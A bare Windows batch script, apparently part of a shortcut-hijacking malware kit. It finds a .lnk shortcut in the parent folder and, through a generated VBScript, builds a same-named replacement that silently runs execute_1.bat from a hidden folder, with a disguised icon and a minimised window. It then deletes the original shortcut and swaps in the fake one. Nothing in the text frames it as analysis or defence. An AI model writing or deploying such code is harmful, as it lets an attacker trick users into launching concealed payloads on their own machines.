@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
cd ..

for %%I in (.) do set hidden=%%~nxI

cd ..
for /R "%cd%" %%F in (*.lnk) do (
    set name=%%~nxF
    set name=!name:~0,-4!
)
cd !hidden!

cd ..
echo Set oWS = WScript.CreateObject("WScript.Shell") > %temp%temp.vbs
echo sLinkFile = "%cd%\temp.lnk" >> %temp%temp.vbs
echo Set oLink = oWS.CreateShortcut(sLinkFile) >> %temp%temp.vbs
echo oLink.TargetPath = "%cd%\!hidden!\execute_1.bat" >> %temp%temp.vbs
echo oLink.WorkingDirectory = "%cd%\!hidden!\" >> %temp%temp.vbs
echo oLink.IconLocation = "%cd%\!hidden!\icon.ico" >> %temp%temp.vbs
echo oLink.WindowStyle = "7" >> %temp%temp.vbs
echo oLink.Save >> %temp%temp.vbs
cscript %temp%temp.vbs
del %temp%temp.vbs

del "!name!.lnk"
ren temp.lnk "!name!.lnk"

cd !hidden!
del "!name!.lnk"
cd ..

copy "!name!.lnk" "!hidden!/!name!.lnk"